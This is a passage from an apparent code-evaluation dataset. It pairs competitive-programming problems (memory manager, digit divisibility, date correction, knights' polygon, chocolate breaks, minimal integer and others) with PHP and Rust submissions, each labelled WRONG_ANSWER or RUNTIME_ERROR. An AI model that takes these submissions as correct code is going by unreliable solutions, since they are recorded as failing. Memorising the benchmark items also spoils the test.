}\n}\nelseif($d == \"erase\")\n{\n    for($y = 1; $y <= $b; $y++)\n    {\n        if($c[$y] == $e)\n        {\n            $k = 1;\n            $c[$y] = 0;\n        }\n    }\n    if($k == 0)\n    {\n        print \"ILLEGAL_ERASE_ARGUMENT\";\n    }\n}\nelseif($d == \"defragment\")\n{\n    for($y = 1; $y <= $b; $y++)\n    {\n        if($c[$y] == 0)\n        {\n            unset($c[$y]);\n        }\n    }\n    $l = array();\n    $m = 1;\n    for($y = 1; $y <= $b; $y++)\n    {\n        if($c[$y] == TRUE)\n        {\n            $l[$m] = $c[$y];\n            $m++;\n        }\n    }\n    $c = $l;\n    $n = $b - count($c);\n    for($y = 0; $y < $n; $y++)\n    {\n        array_push($c, 0);\n    }\n}\n?>","description":"There is little time left before the release of the first national operating system BerlOS. Some of its components are not finished yet \u2014 the memory manager is among them. According to the developers' plan, in the first release the memory manager will be very simple and rectilinear. It will support three operations:   alloc n \u2014 to allocate n bytes of the memory and return the allocated block's identifier x;  erase x \u2014 to erase the block with the identifier x;  defragment \u2014 to defragment the free memory, bringing all the blocks as close to the beginning of the memory as possible and preserving their respective order; The memory model in this case is very simple. It is a sequence of m bytes, numbered for convenience from the first to the m-th.The first operation alloc n takes as the only parameter the size of the memory block that is to be allocated. While processing this operation, a free block of n successive bytes is being allocated in the memory. If the amount of such blocks is more than one, the block closest to the beginning of the memory (i.e. to the first byte) is prefered. All these bytes are marked as not free, and the memory manager returns a 32-bit integer numerical token that is the identifier of this block. If it is impossible to allocate a free block of this size, the function returns NULL.The second operation erase x takes as its parameter the identifier of some block. This operation frees the system memory, marking the bytes of this block as free for further use. In the case when this identifier does not point to the previously allocated block, which has not been erased yet, the function returns ILLEGAL_ERASE_ARGUMENT.The last operation defragment does not have any arguments and simply brings the occupied memory sections closer to the beginning of the memory without changing their respective order.In the current implementation you are to use successive integers, starting with 1, as identifiers. Each successful alloc operation procession should return following number. Unsuccessful alloc operations do not affect numeration.You are to write the implementation of the memory manager. You should output the returned value for each alloc command. You should also output ILLEGAL_ERASE_ARGUMENT for all the failed erase commands.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains two positive integers t and m (1\u2009\u2264\u2009t\u2009\u2264\u2009100;1\u2009\u2264\u2009m\u2009\u2264\u2009100), where t \u2014 the amount of operations given to the memory manager for processing, and m \u2014 the available memory size in bytes. Then there follow t lines where the operations themselves are given. The first operation is alloc n (1\u2009\u2264\u2009n\u2009\u2264\u2009100), where n is an integer. The second one is erase x, where x is an arbitrary 32-bit integer numerical token. The third operation is defragment. ","output_spec":"Output the sequence of lines. Each line should contain either the result of alloc operation procession , or ILLEGAL_ERASE_ARGUMENT as a result of failed erase operation procession. Output lines should go in the same order in which the operations are processed. Successful procession of alloc operation should return integers, starting with 1, as the identifiers of the allocated blocks.","notes":null,"sample_inputs":["6 10\nalloc 5\nalloc 3\nerase 1\nalloc 6\ndefragment\nalloc 6"],"sample_outputs":["1\n2\nNULL\n3"]}
{"difficulty":1600,"lang":"PHP","lang_cluster":"php","src_uid":"b263917e47e1c84340bcb1c77999fd7e","submission_id":"re_1370","tags":["constructive algorithms","greedy","math","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\n$n = trim(fgets(STDIN));\n\n$a = explode(' ',trim(fgets(STDIN)));\n\n$c = array();\nforeach($a as $v) $c[$v] ++;\n\nif($c[0] == 0) {print '-1'; exit(0);}\n\n$r = ($c[8] % 3) * 8;\n$r += ($c[7] % 3) * 7;\n$r += ($c[5] % 3) * 5;\n$r += ($c[4] % 3) * 4;\n$r += ($c[2] % 3) * 2;\n$r += ($c[1] % 3) * 1;\n\n$r %= 3;\n\nswitch($r){\n case 1: if($c[1] > 0) {$c[1] --; $r --; break;}\n         if($c[4] > 0) {$c[4] --; $r --; break;}\n         if($c[7] > 0) {$c[7] --; $r --; break;}\n         break;\n case 2: if($c[2] > 0) {$c[2] --; $r -= 2; break;}\n         if($c[5] > 0) {$c[5] --; $r -= 2; break;}\n         if($c[8] > 0) {$c[8] --; $r -= 2; break;}\n         if($c[1] > 1) {$c[1] -= 2; $r -= 2; break;}\n         if($c[1] > 0 && $c[4] > 0) {$c[1] --; $c[4] --; $r -= 2; break;}\n         if($c[4] > 1) {$c[4] -= 2; $r -= 2; break;}\n         if($c[1] > 0 && $c[7] > 0) {$c[1] --; $c[7] --; $r -= 2; break;}\n         if($c[4] > 0 && $c[7] > 0) {$c[4] --; $c[7] --; $r -= 2; break;}\n         if($c[7] > 1) {$c[7] -= 2; $r -= 2; break;}\n         break;\n}\n$s='';\nif($r != 0) {print '-1'; exit(0);} else\nfor($i=9;$i>=0;$i--) $s .= str_repeat($i,$c[$i]);\n\nif($s[0] == '0') print '0'; else print $s;\n?>","description":"Furik loves math lessons very much, so he doesn't attend them, unlike Rubik. But now Furik wants to get a good mark for math. For that Ms. Ivanova, his math teacher, gave him a new task. Furik solved the task immediately. Can you?You are given a set of digits, your task is to find the maximum integer that you can make from these digits. The made number must be divisible by 2, 3, 5 without a residue. It is permitted to use not all digits from the set, it is forbidden to use leading zeroes.Each digit is allowed to occur in the number the same number of times it occurs in the set.","input_from":"standard input","output_to":"standard output","input_spec":"A single line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100000) \u2014 the number of digits in the set. The second line contains n digits, the digits are separated by a single space. ","output_spec":"On a single line print the answer to the problem. If such number does not exist, then you should print -1.","notes":"NoteIn the first sample there is only one number you can make \u2014 0. In the second sample the sought number is 5554443330. In the third sample it is impossible to make the required number.","sample_inputs":["1\n0","11\n3 4 5 4 5 3 5 3 4 4 0","8\n3 2 5 1 5 2 2 3"],"sample_outputs":["0","5554443330","-1"]}
{"difficulty":1700,"lang":"PHP","lang_cluster":"php","src_uid":"c175d010d75c391d0b25391fecff007c","submission_id":"re_1312","tags":["implementation","greedy","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\n$a = trim(fgets(STDIN));\n$b = array();\nfor($x = 1; $x <= $a; $x++)\n{\n    $c = trim(fgets(STDIN));\n    array_push($b, $c);\n}\n$d = str_split($b[0]);\nif($d[0] > 1)\n{\n    $d[0] = 1;\n}\nelseif($d[1] > 0)\n{\n    $d[1] = 0;\n}\nelseif($d[2] > 0)\n{\n    $d[2] = 0;\n}\nelseif($d[3] > 0)\n{\n    $d[3] = 0;\n}\n$b[0] = implode(\"\", $d);\nfor($x = 0; $x < $a - 1; $x++)\n{\n    if($b[$x] == $b[$x + 1])\n    {\n        continue;\n    }\n    elseif($b[$x] < $b[$x + 1])\n    {\n        $g = 0;\n        $e = array();\n        $f = $b[$x + 1];\n        for($y = 1; $y < 10; $y++)\n        {\n            $f[0] = $y;\n            array_push($e, $f);\n        }\n        $f = $b[$x + 1];\n        for($y = 0; $y < 10; $y++)\n        {\n            $f[1] = $y;\n            array_push($e, $f);\n        }\n        $f = $b[$x + 1];\n        for($y = 0; $y < 10; $y++)\n        {\n            $f[2] = $y;\n            array_push($e, $f);\n        }\n        $f = $b[$x + 1];\n        for($y = 0; $y < 10; $y++)\n        {\n            $f[3] = $y;\n            array_push($e, $f);\n        }\n        sort($e);\n        for($y = 0; $y < count($e); $y++)\n        {\n            if($e[$y] >= $b[$x])\n            {\n                $b[$x + 1] = $e[$y];\n                $g = 1;\n                break;\n            }\n        }\n    }\n    elseif($b[$x] > $b[$x + 1])\n    {\n        $h = 0;\n        $e = array();\n        $f = $b[$x + 1];\n        for($y = 1; $y < 10; $y++)\n        {\n            $f[0] = $y;\n            array_push($e, $f);\n        }\n        $f = $b[$x + 1];\n        for($y = 0; $y < 10; $y++)\n        {\n            $f[1] = $y;\n            array_push($e, $f);\n        }\n        $f = $b[$x + 1];\n        for($y = 0; $y < 10; $y++)\n        {\n            $f[2] = $y;\n            array_push($e, $f);\n        }\n        $f = $b[$x + 1];\n        for($y = 0; $y < 10; $y++)\n        {\n            $f[3] = $y;\n            array_push($e, $f);\n        }\n        rsort($e);\n        for($y = 0; $y < count($e); $y++)\n        {\n            if($b[$x] >= $e[$y])\n            {\n                $b[$x + 1] = $e[$y];\n                $h = 1;\n                break;\n            }\n        }\n    }\n}\nif(($b[0] < 1000) || ($b[count($b) - 1] > 2011) || (($g == 0) && ($g == TRUE)) || (($h == 0) && ($h == TRUE)))\n{\n    print \"No solution\";\n}\nelse\n{\n    for($x = 0; $x < count($b) - 1; $x++)\n    {\n        print $b[$x] . \"\\n\";\n    }\n    print $b[$x];\n}\n?>","description":"The History of Magic is perhaps the most boring subject in the Hogwarts school of Witchcraft and Wizardry. Harry Potter is usually asleep during history lessons, and his magical quill writes the lectures for him. Professor Binns, the history of magic teacher, lectures in such a boring and monotonous voice, that he has a soporific effect even on the quill. That's why the quill often makes mistakes, especially in dates.So, at the end of the semester Professor Binns decided to collect the students' parchments with notes and check them. Ron Weasley is in a panic: Harry's notes may contain errors, but at least he has some notes, whereas Ron does not have any. Ronald also has been sleeping during the lectures and his quill had been eaten by his rat Scabbers. Hermione Granger refused to give Ron her notes, because, in her opinion, everyone should learn on their own. Therefore, Ron has no choice but to copy Harry's notes.Due to the quill's errors Harry's dates are absolutely confused: the years of goblin rebellions and other important events for the wizarding world do not follow in order, and sometimes even dates from the future occur. Now Ron wants to change some of the digits while he copies the notes so that the dates were in the chronological (i.e. non-decreasing) order and so that the notes did not have any dates strictly later than 2011, or strictly before than 1000. To make the resulting sequence as close as possible to the one dictated by Professor Binns, Ron will change no more than one digit in each date into other digit. Help him do it.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains an integer n (1\u2009\u2264\u2009n\u2009\u2264\u20091000). It represents the number of dates in Harry's notes. Next n lines contain the actual dates y1, y2, ..., yn, each line contains a date. Each date is a four-digit integer (1000\u2009\u2264\u2009yi\u2009\u2264\u20099999).","output_spec":"Print n numbers z1, z2, ..., zn (1000\u2009\u2264\u2009zi\u2009\u2264\u20092011). They are Ron's resulting dates. Print each number on a single line. Numbers zi must form the non-decreasing sequence. Each number zi should differ from the corresponding date yi in no more than one digit. It is not allowed to change the first digit of a number into 0. If there are several possible solutions, print any of them. If there's no solution, print \"No solution\" (without the quotes).","notes":null,"sample_inputs":["3\n1875\n1936\n1721","4\n9999\n2000\n3000\n3011","3\n1999\n5055\n2000"],"sample_outputs":["1835\n1836\n1921","1999\n2000\n2000\n2011","No solution"]}
{"difficulty":1900,"lang":"PHP","lang_cluster":"php","src_uid":"cb082cbe9b34a45da851b6764bbc30c3","submission_id":"re_997","tags":["brute force","sortings","greedy","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\nlist($a, $b) = explode(\" \", trim(fgets(STDIN)));\n$c = trim(fgets(STDIN));\n$d = array(0 => 0, 1 => 0, 2 => 0, 3 => 0, 4 => 0, 5 => 0, 6 => 0, 7 => 0, 8 => 0, 9 => 0);\nfor($x = 0; $x < $a; $x++)\n{\n     $d[$c[$x]]++;\n}\n$e = array_keys($d);\n$f = 0;\nfor($x = 0; $x < 10; $x++)\n{\n     if($d[$e[$x]] >= $b)\n     {\n          $f = 1;\n          break;\n     }\n}\nif($f == 1)\n{\n     print \"0\\n\";\n     print $c;\n}\nelse\n{\n     $g = array();\n     $h = array();\n     for($x = 0; $x < 10; $x++)\n     {\n          $i = 0;\n          $i2 = 0;\n          $i += $d[$x];\n          $j = 2;\n          $k = 1;\n          $l = 1;\n          $m = array_fill(0, 10, 0);\n          while(TRUE)\n          {\n               $n = $j % 2;\n               $j++;\n               if($n == 0)\n               {\n                    $o = $x + $k;\n                    if($o <= 9)\n                    {\n                         $i += $d[$o];\n                         if($i >= $b)\n                         {\n                              $p = $i - $b;\n                              $r = $d[$o] - $p;\n                              $i -= $d[$o];\n                              $i += $r;\n                              $i2 += $r * abs($k);\n                              $m[$o] = $r;\n                              break;\n                         }\n                         else\n                         {\n                              $i2 += $d[$o] * abs($k);\n                              $m[$o] = $d[$o];\n                         }\n                         $k++;\n                    }\n               }\n               else\n               {\n                    $o = $x - $l;\n                    if($o >= 0)\n                    {\n                         $i += $d[$o];\n                         if($i >= $b)\n                         {\n                              $p = $i - $b;\n                              $r = $d[$o] - $p;\n                              $i -= $d[$o];\n                              $i += $r;\n                              $i2 += $r * abs($l);\n                              $m[$o] = $r;\n                              break;\n                         }\n                         else\n                         {\n                              $i2 += $d[$o] * abs($l);\n                              $m[$o] = $d[$o];\n                         }\n                         $l++;\n                    }\n               }\n          }\n          $g[$x] = $i2;\n          $h[$x] = $m;\n     }\n     $q = min($g);\n     $t = array();\n     for($x = 0; $x < 10; $x++)\n     {\n          if($g[$x] == $q)\n          {\n               $r = $h[$x];\n               $s = str_split($c);\n               for($y = 0; $y < $a; $y++)\n               {\n                    if(($r[$s[$y]] > 0) && ($s[$y] > $x))\n                    {\n                         $r[$s[$y]]--;\n                         $s[$y] = $x;\n                    }\n               }\n               for($y = $a - 1; $y >= 0; $y--)\n               {\n                    if(($r[$s[$y]] > 0) && ($s[$y] < $x))\n                    {\n                         $r[$s[$y]]--;\n                         $s[$y] = $x;\n                    }\n               }\n               $t[count($t)] = implode($s);\n          }\n     }\n     print $g[$q] . \"\\n\";\n     print min($t);\n}\n?>","description":"A car number in Berland consists of exactly n digits. A number is called beautiful if it has at least k equal digits. Vasya wants to change the digits in his car's number so that the number became beautiful. To replace one of n digits Vasya has to pay the sum of money, equal to the absolute difference between the old digit and the new one.Help Vasya: find the minimum sum of money he should pay to make the number of his car beautiful. You should also find the resulting beautiful number. If there are several such numbers, then print the lexicographically minimum one.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers n and k (2\u2009\u2264\u2009n\u2009\u2264\u2009104,\u20092\u2009\u2264\u2009k\u2009\u2264\u2009n) which represent how many digits the number has and how many equal digits a beautiful number should have. The second line consists of n digits. It describes the old number of Vasya's car. It is guaranteed that the number contains no spaces and only contains digits.","output_spec":"On the first line print the minimum sum of money Vasya needs to change the number. On the second line print the car's new number. If there are several solutions, print the lexicographically minimum one.","notes":"NoteIn the first sample replacing the second digit with an \"8\" costs |9\u2009-\u20098|\u2009=\u20091. Replacing the fifth digit with an \"8\" costs the same. Replacing the sixth digit costs |6\u2009-\u20098|\u2009=\u20092. As a result, Vasya will pay 1\u2009+\u20091\u2009+\u20092\u2009=\u20094 for a beautiful number \"888188\".The lexicographical comparison of strings is performed by the &lt; operator in modern programming languages. The string x is lexicographically smaller than the string y, if there exists such i (1\u2009\u2264\u2009i\u2009\u2264\u2009n), that xi\u2009&lt;\u2009yi, and for any j (1\u2009\u2264\u2009j\u2009&lt;\u2009i) xj\u2009=\u2009yj. The strings compared in this problem will always have the length n.","sample_inputs":["6 5\n898196","3 2\n533","10 6\n0001112223"],"sample_outputs":["4\n888188","0\n533","3\n0000002223"]}
{"difficulty":1600,"lang":"PHP","lang_cluster":"php","src_uid":"d3a0402de1338a1a542a86ac5b484acc","submission_id":"re_1090","tags":["dp","number theory","math"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\nclass INPUT_HELP{\n    public function read_array(){\n        $a[0] = '';\n        $j = 0;\n        $input = fgets(STDIN);\n        for ($i = 0; $i < strlen($input); $i++){\n            if (preg_replace(\"\/[0-9A-z\u0410-\u044f._-]\/\",null,$input[$i]) == false) {\n                $a[$j] = $a[$j].$input[$i];\n            } else {\n                if ($a[$j] != '') {\n                    ++$j;\n                    $a[$j] = '';\n                }\n            }\n        }\n        return $a;\n    }\n    public function read_one(){\n        $array = $this->read_array();\n        return $array[0];\n    }\n}\n?>\n<?php\n    $input_connect = new INPUT_HELP();\n    $n = $input_connect->read_one();\n    $a = $input_connect->read_array();\n    for ($i = 0; $i < $n; $i++) {\n        $num[$i] = $i;\n    }\n    for ($i = $n; $i < 2 * $n; $i++){\n        $a[$i] = $a[$i - $n];\n        $num[$i] = $num[$i - $n];\n    }\n    $h = -1;\n    for ($j = 1; $j < $n; $j++){\n        if ($n % $j != 0 || $n \/ $j < 3) continue;\n        ++$h;\n        $div[$h] = $j;\n    }\n    for ($i = 0; $i < $n; $i++){\n        if ($a[$i] == 0) continue;\n        for ($j = 0; $j < $h; $j++){\n            $k = $i + $div[$j];\n            while ($a[$k] == 1 && $num[$k] != $i) $k += $div[$j];\n            if ($num[$k] == $i) {\n                echo \"YES\";\n                die(0);\n            }\n        } \n    }\n    echo \"NO\";\n?>","description":"There are n knights sitting at the Round Table at an equal distance from each other. Each of them is either in a good or in a bad mood.Merlin, the wizard predicted to King Arthur that the next month will turn out to be particularly fortunate if the regular polygon can be found. On all vertices of the polygon knights in a good mood should be located. Otherwise, the next month will bring misfortunes.A convex polygon is regular if all its sides have same length and all his angles are equal. In this problem we consider only regular polygons with at least 3 vertices, i. e. only nondegenerated.On a picture below some examples of such polygons are present. Green points mean knights in a good mood. Red points mean ones in a bad mood.  King Arthur knows the knights' moods. Help him find out if the next month will be fortunate or not.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains number n, which is the number of knights at the round table (3\u2009\u2264\u2009n\u2009\u2264\u2009105). The second line contains space-separated moods of all the n knights in the order of passing them around the table. \"1\" means that the knight is in a good mood an \"0\" means that he is in a bad mood.","output_spec":"Print \"YES\" without the quotes if the following month will turn out to be lucky. Otherwise, print \"NO\".","notes":null,"sample_inputs":["3\n1 1 1","6\n1 0 1 1 1 0","6\n1 0 0 1 0 1"],"sample_outputs":["YES","YES","NO"]}
{"difficulty":2000,"lang":"PHP","lang_cluster":"php","src_uid":"e33b0a752dc1aba25da21e20435e3fe2","submission_id":"re_1265","tags":["binary search","*special"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\n list($n, $k) = explode(\" \", fgets(STDIN));\n $n = (int) $n;\n $k = (int) $k;\n $s = fgets(STDIN);\n $b = 0;\n $e = $n - 2;\n while ($b + 1 < $e) {\n     $mm = floor(($b + $e) \/ 2);\n     $q = true;\n     $kk = $k - 2;\n     $lastq = 0;\n     $possible = -1;\n     for ($i = 1; $i < strlen($s) - 1; $i++) {\n         if ($s[$i] == '0') $possible = $i;\n         if ($i - $lastq - 1 == $mm) {\n             if ($kk > 0 && $possible != -1) {\n                 $kk--;\n                 $lastq = $possible;\n                 $possible = -1;\n             } else {\n                 $q = false;\n                 break;\n             }\n         }\n     }\n     if ($q && $n - $lastq - 2 > $mm) $q = false;\n     if ($q) $e = $mm; else $b = $mm;\n }\n $qq = true;\n for ($i = 0; $i < $n; $i++) {\n     if ($s[$i] == '1') {\n         $qq = false;\n     }\n }\n if ($qq && $n == $k) $e = 0;\n echo $e;\n?> ","description":"Polycarp's workday lasts exactly $$$n$$$ minutes. He loves chocolate bars and can eat one bar in one minute. Today Polycarp has $$$k$$$ bars at the beginning of the workday.In some minutes of the workday Polycarp has important things to do and in such minutes he is not able to eat a chocolate bar. In other minutes he can either eat or not eat one chocolate bar. It is guaranteed, that in the first and in the last minutes of the workday Polycarp has no important things to do and he will always eat bars in this minutes to gladden himself at the begining and at the end of the workday. Also it is guaranteed, that $$$k$$$ is strictly greater than $$$1$$$.Your task is to determine such an order of eating chocolate bars that the maximum break time between eating bars is as minimum as possible.Consider that Polycarp eats a bar in the minute $$$x$$$ and the next bar in the minute $$$y$$$ ($$$x &lt; y$$$). Then the break time is equal to $$$y - x - 1$$$ minutes. It is not necessary for Polycarp to eat all bars he has.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers $$$n$$$ and $$$k$$$ ($$$2 \\le n \\le 200\\,000$$$, $$$2 \\le k \\le n$$$) \u2014 the length of the workday in minutes and the number of chocolate bars, which Polycarp has in the beginning of the workday. The second line contains the string with length $$$n$$$ consisting of zeros and ones. If the $$$i$$$-th symbol in the string equals to zero, Polycarp has no important things to do in the minute $$$i$$$ and he can eat a chocolate bar. In the other case, Polycarp is busy in the minute $$$i$$$ and can not eat a chocolate bar. It is guaranteed, that the first and the last characters of the string are equal to zero, and Polycarp always eats chocolate bars in these minutes.","output_spec":"Print the minimum possible break in minutes between eating chocolate bars.","notes":"NoteIn the first example Polycarp can not eat the chocolate bar in the second minute, so the time of the break equals to one minute.In the second example Polycarp will eat bars in the minutes $$$1$$$ and $$$8$$$ anyway, also he needs to eat the chocolate bar in the minute $$$5$$$, so that the time of the maximum break will be equal to $$$3$$$ minutes.","sample_inputs":["3 3\n010","8 3\n01010110"],"sample_outputs":["1","3"]}
{"difficulty":1800,"lang":"PHP","lang_cluster":"php","src_uid":"e9c486e2d942700e0644dff29b6e3be6","submission_id":"re_771","tags":["implementation","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\n    \/\/$handle = @fopen(\"input.txt\", \"r\");\n    list($n, $max, $reg) = explode(' ', trim(fgets(STDIN)));\n\n    for ($i = 0; $i < $n; $i++) {\n        list($spell[$i][0], $spell[$i][1]) = explode(' ', trim(fgets(STDIN)));\n    }\n\n    $cur = $max;\n    $sum = 0;\n    $sec = 0;\n    $spells = 0;\n\n    while (true) {\n        $cur -= $sum;\n        $cur += $reg;\n        $cur = min($max, $cur);\n        if ($cur <= 0) {\n            break;\n        }        \n        $mpos = 0;\n        $mmax = 0;\n        $mpow = 0;\n        for ($i = 0; $i < $n; $i++) {\n            if ((double)($spell[$i][0]) >= (double)(100 * $cur \/ $max)\n                    && $spell[$i][1] > $mmax\n                    && !isset($spell[$i][2])) {\n                $mmax = $spell[$i][1];\n                $mpos = $i;\n                $mpow = $spell[$i][0];\n            }\n        }\n\n        if ($mpow == 0 && $sum <= $reg) {\n            echo 'NO';\n            return;\n        } else if ($mpow != 0) {\n            $spells++;\n            $spell[$mpos][2]= $sec;\n            $sum += $mmax;\n        }\n        $sec++;\n    }\n\n    echo \"YES\\n\";\n    echo \"$sec $spells\\n\";\n    for ($i = 0; $i < $n; $i++) {\n        if (isset($spell[$i][2])) {\n            $pos = $i + 1;\n            echo \"{$spell[$i][2]} {$pos}\\n\";\n        }\n    }","description":"Vasya\u2019s elder brother Petya loves playing computer games. In one of his favourite computer games Petya reached the final level where a fight with the boss take place.While playing the game Petya found spell scrolls and now he is about to use them. Let\u2019s describe the way fighting goes on this level:1) The boss has two parameters: max \u2014 the initial amount of health and reg \u2014 regeneration rate per second.2) Every scroll also has two parameters: powi \u2014 spell power measured in percents \u2014 the maximal amount of health counted off the initial one, which allows to use the scroll (i.e. if the boss has more than powi percent of health the scroll cannot be used); and dmgi the damage per second inflicted upon the boss if the scroll is used. As soon as a scroll is used it disappears and another spell is cast upon the boss that inflicts dmgi of damage per second upon him until the end of the game.During the battle the actions per second are performed in the following order: first the boss gets the damage from all the spells cast upon him, then he regenerates reg of health (at the same time he can\u2019t have more than max of health), then the player may use another scroll (no more than one per second).The boss is considered to be defeated if at the end of a second he has nonpositive (\u2009\u2264\u20090) amount of health.Help Petya to determine whether he can win with the set of scrolls available to him and if he can, determine the minimal number of seconds he needs to do it.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integers N, max and reg (1\u2009\u2264\u2009N,\u2009max,\u2009reg\u2009\u2264\u20091000) \u2013\u2013 the amount of scrolls and the parameters of the boss. The next N lines contain two integers powi and dmgi each \u2014 the parameters of the i-th scroll (0\u2009\u2264\u2009powi\u2009\u2264\u2009100, 1\u2009\u2264\u2009dmgi\u2009\u2264\u20092000). ","output_spec":"In case Petya can\u2019t complete this level, output in the single line NO. Otherwise, output on the first line YES. On the second line output the minimal time after which the boss can be defeated and the number of used scrolls. In the next lines for each used scroll output space-separated number of seconds passed from the start of the battle to the moment the scroll was used and the number of the scroll. Scrolls are numbered starting from 1 in the input order. The first scroll is considered to be available to be used after 0 seconds. Output scrolls in the order they were used. It is not allowed to use scrolls after the boss is defeated.","notes":null,"sample_inputs":["2 10 3\n100 3\n99 1","2 100 10\n100 11\n90 9"],"sample_outputs":["NO","YES\n19 2\n0 1\n10 2"]}
{"difficulty":1000,"lang":"Rust","lang_cluster":"rust","src_uid":"0515ac888937a4dda30cad5e2383164f","submission_id":"b86d7372517b067a3a8d0fab0e833203","tags":["implementation","greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"type Pair = (usize, usize);\nfn input_pair() -> Pair {\n    let mut buf = String::new();\n    std::io::stdin().read_line(&mut buf).unwrap();\n    let buf: Vec<usize> = buf\n        .trim()\n        .split_whitespace()\n        .map(|elem| elem.parse().unwrap())\n        .collect();\n    (buf[0], buf[1])\n}\n\nfn minimize(num: &str, n: usize, mut k: usize) -> String {\n    if n == 1 {\n        String::from(\"0\")\n    } else if k == 0 {\n        String::from(num)\n    } else {\n        num.chars()\n            .zip(0..)\n            .map(|(c, i)| {\n                if i == 0 {\n                    if c != '1' {\n                        k -= 1\n                    }\n                    '1'\n                } else if k > 0 {\n                    if c != '0' {\n                        k -= 1\n                    }\n                    '0'\n                } else {\n                    c\n                }\n            })\n            .collect()\n    }\n}\n\nfn main() {\n    let (n, k) = input_pair();\n\n    let mut num = String::with_capacity(n);\n    std::io::stdin().read_line(&mut num).unwrap();\n    let num = num.trim();\n\n    print!(\"{}\", minimize(&num, n, k));\n}","description":"Ania has a large integer $$$S$$$. Its decimal representation has length $$$n$$$ and doesn't contain any leading zeroes. Ania is allowed to change at most $$$k$$$ digits of $$$S$$$. She wants to do it in such a way that $$$S$$$ still won't contain any leading zeroes and it'll be minimal possible. What integer will Ania finish with?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers $$$n$$$ and $$$k$$$ ($$$1 \\leq n \\leq 200\\,000$$$, $$$0 \\leq k \\leq n$$$) \u2014 the number of digits in the decimal representation of $$$S$$$ and the maximum allowed number of changed digits. The second line contains the integer $$$S$$$. It's guaranteed that $$$S$$$ has exactly $$$n$$$ digits and doesn't contain any leading zeroes.","output_spec":"Output the minimal possible value of $$$S$$$ which Ania can end with. Note that the resulting integer should also have $$$n$$$ digits.","notes":"NoteA number has leading zeroes if it consists of at least two digits and its first digit is $$$0$$$. For example, numbers $$$00$$$, $$$00069$$$ and $$$0101$$$ have leading zeroes, while $$$0$$$, $$$3000$$$ and $$$1010$$$ don't have leading zeroes.","sample_inputs":["5 3\n51528","3 2\n102","1 1\n1"],"sample_outputs":["10028","100","0"]}
{"difficulty":1400,"lang":"Rust","lang_cluster":"rust","src_uid":"08f1ba79ced688958695a7cfcfdda035","submission_id":"22b8b3ab4cbf490336a589dd330f840b","tags":["dp"],"exec_outcome":"WRONG_ANSWER","source_code":"\/\/ https:\/\/codeforces.com\/problemset\/problem\/698\/A\nuse std::io;\n\nfn main() {\n    let mut n = String::new();\n\n    io::stdin()\n        .read_line(&mut n)\n        .unwrap();\n\n    let n: i64 = n.trim().parse().unwrap();\n\n    let mut line = String::new();\n\n    io::stdin()\n        .read_line(&mut line)\n        .unwrap();\n\n    let a: Vec<i64> =\n        line\n        .split_whitespace()\n        .map(|x| x.parse().unwrap())\n        .collect();\n\n    let mut last = 0;\n    let mut ans = 0;\n    for day in a {\n        let available = day&(!last);\n        if available == 0 {\n            last = 0;\n            ans += 1;\n        } else if available != 3 {\n            last = available;\n        } else {\n            last = !last;\n        }\n    }\n    println!(\"{}\", ans);\n}\n","description":"Vasya has n days of vacations! So he decided to improve his IT skills and do sport. Vasya knows the following information about each of this n days: whether that gym opened and whether a contest was carried out in the Internet on that day. For the i-th day there are four options:  on this day the gym is closed and the contest is not carried out;  on this day the gym is closed and the contest is carried out;  on this day the gym is open and the contest is not carried out;  on this day the gym is open and the contest is carried out. On each of days Vasya can either have a rest or write the contest (if it is carried out on this day), or do sport (if the gym is open on this day).Find the minimum number of days on which Vasya will have a rest (it means, he will not do sport and write the contest at the same time). The only limitation that Vasya has \u2014 he does not want to do the same activity on two consecutive days: it means, he will not do sport on two consecutive days, and write the contest on two consecutive days.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of days of Vasya's vacations. The second line contains the sequence of integers a1,\u2009a2,\u2009...,\u2009an (0\u2009\u2264\u2009ai\u2009\u2264\u20093) separated by space, where:    ai equals 0, if on the i-th day of vacations the gym is closed and the contest is not carried out;  ai equals 1, if on the i-th day of vacations the gym is closed, but the contest is carried out;  ai equals 2, if on the i-th day of vacations the gym is open and the contest is not carried out;  ai equals 3, if on the i-th day of vacations the gym is open and the contest is carried out.","output_spec":"Print the minimum possible number of days on which Vasya will have a rest. Remember that Vasya refuses:   to do sport on any two consecutive days,  to write the contest on any two consecutive days. ","notes":"NoteIn the first test Vasya can write the contest on the day number 1 and do sport on the day number 3. Thus, he will have a rest for only 2 days.In the second test Vasya should write contests on days number 1, 3, 5 and 7, in other days do sport. Thus, he will not have a rest for a single day.In the third test Vasya can do sport either on a day number 1 or number 2. He can not do sport in two days, because it will be contrary to the his limitation. Thus, he will have a rest for only one day.","sample_inputs":["4\n1 3 2 0","7\n1 3 3 2 1 2 3","2\n2 2"],"sample_outputs":["2","0","1"]}
